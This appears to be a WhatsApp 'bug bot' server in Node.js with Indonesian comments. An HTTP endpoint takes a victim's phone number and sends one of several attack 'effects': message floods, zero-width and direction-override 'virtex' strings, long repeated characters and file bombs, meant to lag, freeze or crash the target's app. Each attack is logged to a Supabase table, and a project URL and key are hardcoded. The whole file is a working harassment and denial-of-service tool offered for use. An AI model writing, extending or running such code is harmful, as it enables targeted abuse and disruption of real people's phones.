const express = require('express');
const { Client, LocalAuth, MessageMedia } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const { createClient } = require('@supabase/supabase-js');

const app = express();
app.use(express.json());

// ============================================================
// KONFIGURASI SUPABASE (SAMA DENGAN FRONTEND)
// ============================================================
const SUPABASE_URL = 'https://nxihknuzzmqbdcazikln.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_NnBJVtkGKDp1ZhLVYpxKXg_KMCK9EvO';
const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// ============================================================
// KONFIGURASI WHATSAPP CLIENT
// ============================================================
const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    }
});

let isReady = false;

client.on('qr', qr => {
    console.log('📱 SCAN QR CODE:');
    qrcode.generate(qr, { small: true });
});

client.on('ready', () => {
    console.log('✅ Bot WhatsApp siap!');
    isReady = true;
});

client.on('disconnected', () => {
    isReady = false;
});

client.initialize();

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

// ============================================================
// FUNGSI UPDATE STATISTIK & HISTORY KE SUPABASE
// ============================================================
async function updateUserStats(username, effect, target) {
    if (!username) return;

    try {
        // 1. Ambil statistik saat ini
        const { data: stats, error: fetchError } = await supabase
            .from('users_stats')
            .select('bug_count, tool_count')
            .eq('username', username)
            .single();

        let bugCount = 0, toolCount = 0;
        if (!fetchError && stats) {
            bugCount = stats.bug_count || 0;
            toolCount = stats.tool_count || 0;
        }

        // 2. Tambah bug_count +1
        bugCount += 1;

        // 3. Simpan kembali
        const { error: upsertError } = await supabase
            .from('users_stats')
            .upsert({
                username: username,
                bug_count: bugCount,
                tool_count: toolCount,
                updated_at: new Date().toISOString()
            }, { onConflict: 'username' });

        if (upsertError) console.error('❌ Gagal update stats:', upsertError);

        // 4. Catat history
        const detail = `Efek: ${effect}\nTarget: ${target}\nJam: ${new Date().toLocaleString('id-ID', { hour12: false })}`;
        const { error: logError } = await supabase
            .from('activity_logs')
            .insert({
                username: username,
                type: 'BUG',
                detail: detail,
                status: 'DONE',
                timestamp: new Date().toISOString()
            });

        if (logError) console.error('❌ Gagal insert log:', logError);

    } catch (err) {
        console.error('❌ Error Supabase:', err);
    }
}

// ============================================================
// ENDPOINT KIRIM BUG
// ============================================================
app.post('/send-bug', async (req, res) => {
    const { targetNumber, effect, username, count = 0 } = req.body;

    if (!isReady) {
        return res.status(503).json({ error: 'Bot WhatsApp belum siap. Scan QR dulu!' });
    }
    if (!targetNumber) {
        return res.status(400).json({ error: 'Nomor target wajib diisi!' });
    }

    const chatId = targetNumber.includes('@c.us') ? targetNumber : `${targetNumber}@c.us`;
    console.log(`🎯 EFEK: ${effect} → TARGET: ${targetNumber} (user: ${username || 'unknown'})`);

    try {
        // --- EFEK DELAY HARD ----------------------------------------------------
        if (effect === 'DELAY HARD') {
            const total = count || 25;
            for (let i = 0; i < total; i++) {
                await client.sendMessage(chatId, `⏳ Delay ke-${i+1}/${total}`);
                await delay(Math.floor(Math.random() * 700) + 200);
            }
        }

        // --- EFEK BLANK HARD ----------------------------------------------------
        else if (effect === 'BLANK HARD') {
            await client.sendMessage(chatId, '\u200B'.repeat(3000));
            await client.sendMessage(chatId, '‎‏‎‏‎‏‎‏‎‏‎‏‎‏'.repeat(200));
            await client.sendMessage(chatId, '​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​'.repeat(100));
        }

        // --- EFEK FREEZE HARD ----------------------------------------------------
        else if (effect === 'FREEZE HARD') {
            const total = count || 60;
            for (let i = 0; i < total; i++) {
                await client.sendMessage(chatId, '•');
                await delay(15);
            }
        }

        // --- EFEK FC INSTANT ----------------------------------------------------
        else if (effect === 'FC INSTANT') {
            await client.sendMessage(chatId, '*_~teks rusak~_*' + ' '.repeat(300) + '*bold tidak tutup');
            await client.sendMessage(chatId, '```bash\n$ echo "hack"\n```' + '\n'.repeat(150) + '```');
            await client.sendMessage(chatId, '‎‏‎‏‎‏'.repeat(300));
            await client.sendMessage(chatId, 'ဪ'.repeat(2000));
        }

        // --- EFEK RESTART HARD ----------------------------------------------------
        else if (effect === 'RESTART HARD') {
            try {
                const media = MessageMedia.fromFilePath('./file.jpg');
                const total = count || 10;
                for (let i = 0; i < total; i++) {
                    await client.sendMessage(chatId, media);
                    await delay(80);
                }
            } catch (e) {
                for (let i = 0; i < 20; i++) {
                    await client.sendMessage(chatId, `📁 FILE DUMMY ${i+1}/20`);
                    await delay(50);
                }
            }
        }

        // --- EFEK BOOTLOOP HARD ----------------------------------------------------
        else if (effect === 'BOOTLOOP HARD') {
            for (let i = 0; i < 30; i++) {
                await client.sendMessage(chatId, '🔄'.repeat(50) + '\u200B'.repeat(300));
                await delay(50);
            }
            try {
                const med = MessageMedia.fromFilePath('./file.jpg');
                await client.sendMessage(chatId, med);
            } catch (e) {}
        }

        // --- EFEK NUKE -----------------------------------------------------------
        else if (effect === 'NUKE') {
            for (let i = 0; i < 20; i++) {
                await client.sendMessage(chatId, '💀 NUKE ' + '💀'.repeat(40));
                await delay(60);
            }
            await client.sendMessage(chatId, '\u200B'.repeat(4000));
            for (let i = 0; i < 50; i++) {
                await client.sendMessage(chatId, '•');
                await delay(10);
            }
            await client.sendMessage(chatId, '*_~rusak~_*' + ' '.repeat(200) + '*');
            try {
                const nukeMedia = MessageMedia.fromFilePath('./file.jpg');
                for (let i = 0; i < 8; i++) {
                    await client.sendMessage(chatId, nukeMedia);
                    await delay(60);
                }
            } catch (e) {}
        }

        // --- EFEK VIRTEX_LEGACY ---------------------------------------------------
        else if (effect === 'VIRTEX_LEGACY') {
            await client.sendMessage(chatId, '\u202E' + 'SERANGAN BALIK' + '\u202D');
            await client.sendMessage(chatId, 'ဪ'.repeat(3000));
            await client.sendMessage(chatId, '‍'.repeat(2000) + '💀');
            await client.sendMessage(chatId, '🔥'.repeat(5000));
        }

        // --- EFEK FILE_BOMB -------------------------------------------------------
        else if (effect === 'FILE_BOMB') {
            const total = count || 25;
            try {
                const smallFile = MessageMedia.fromFilePath('./small.txt');
                for (let i = 0; i < total; i++) {
                    await client.sendMessage(chatId, smallFile);
                    await delay(40);
                }
            } catch (e) {
                for (let i = 0; i < total; i++) {
                    await client.sendMessage(chatId, `📄 FILE BOMB ${i+1}/${total}`);
                    await delay(30);
                }
            }
        }

        else {
            return res.status(400).json({ error: `Efek "${effect}" tidak dikenal!` });
        }

        // ============================================================
        // UPDATE STATISTIK KE SUPABASE (jika username diberikan)
        // ============================================================
        if (username) {
            await updateUserStats(username, effect, targetNumber);
        }

        // ============================================================
        // RESPON SUKSES
        // ============================================================
        res.json({
            success: true,
            effect: effect,
            target: targetNumber,
            message: `✅ Efek "${effect}" berhasil dikirim ke ${targetNumber}`
        });

    } catch (error) {
        console.error('❌ ERROR:', error);
        res.status(500).json({
            error: error.message || 'Gagal mengirim efek'
        });
    }
});

// ============================================================
// ENDPOINT CEK STATUS
// ============================================================
app.get('/status', (req, res) => {
    res.json({
        status: isReady ? 'ready' : 'disconnected',
        message: isReady ? 'Bot WhatsApp siap digunakan' : 'Bot belum siap, scan QR dulu'
    });
});

// ============================================================
// JALANKAN SERVER
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 SERVER BERJALAN DI http://localhost:${PORT}`);
    console.log(`📌 POST /send-bug  → kirim efek`);
    console.log(`📌 GET  /status    → cek bot`);
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
});
